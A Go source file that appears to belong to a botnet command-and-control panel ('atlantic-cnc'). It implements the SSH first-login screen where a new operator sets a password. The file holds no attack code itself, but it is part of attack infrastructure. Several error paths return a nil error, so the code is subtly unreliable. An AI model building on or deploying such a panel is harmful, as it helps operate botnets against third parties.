package views

import (
	"log"
	"time"
	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/models/client/terminal"
	"atlantic-cnc/core/models/util"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)


func Login_NewUser(channel ssh.Channel, conn *ssh.ServerConn, User *database.User) error {
	error,_ := terminal.Banner("login-newuser", User, channel, true, false, nil)
	if error != nil {
		log.Println(error)
		return error
	}

        channel.Write([]byte("             _   _________       __   __    ____  ___________   __ \r\n"))
        channel.Write([]byte("            / | / / ____/ |     / /  / /   / __ \\/ ____/  _/ | / / \r\n"))
        channel.Write([]byte("           /  |/ / __/  | | /| / /  / /   / / / / / __ / //  |/ / \r\n"))
        channel.Write([]byte("          / /|  / /___  | |/ |/ /  / /___/ /_/ / /_/ // // /|  / \r\n"))
        channel.Write([]byte("         /_/ |_/_____/  |__/|__/  /_____/\\____/\\____/___/_/ |_/ \r\n\n\n"))

	channel.Write([]byte("\x1b[0m                       New Password>\x1b[38;5;16m\r\n\r\n"))
	channel.Write([]byte("\x1b[0m                       Confirm new password>\x1b[38;5;16m"))
	NewTerm := term.NewTerminal(channel, "\033[12;38H")
	NewTermconfirm := term.NewTerminal(channel, "\033[14;46H")
	NewPassword, error := NewTerm.ReadLine()
	if error != nil {
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	NewConfirmPassword, error := NewTermconfirm.ReadLine()
	if error != nil {
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	if NewPassword != NewConfirmPassword {
		channel.Write([]byte("\r\n\n\n\x1b[0m                      LOG: Passwords do NOT match\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	if len(NewPassword) <= 5 {
		channel.Write([]byte("\r\n\n\n\x1b[0m                   LOG: Password must be longer then `5`\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	errors := database.EditFeild(User.Username, "password", util.HashPassword(NewPassword))
	if !errors {
		channel.Write([]byte("\r\n\n\n\x1b[0m                 LOG: Failed to update password correctly\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	errors = database.EditFeild(User.Username, "NewUser", "0")
	if !errors {
		channel.Write([]byte("\r\n\n\n\x1b[0m                      LOG: Failed to update password correctly\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	channel.Write([]byte("\r\n\n\n\x1b[0m                    LOG: Password correctly updated, redirecting in `5` seconds\r\n"))

	time.Sleep(5 * time.Second)

	return nil
}
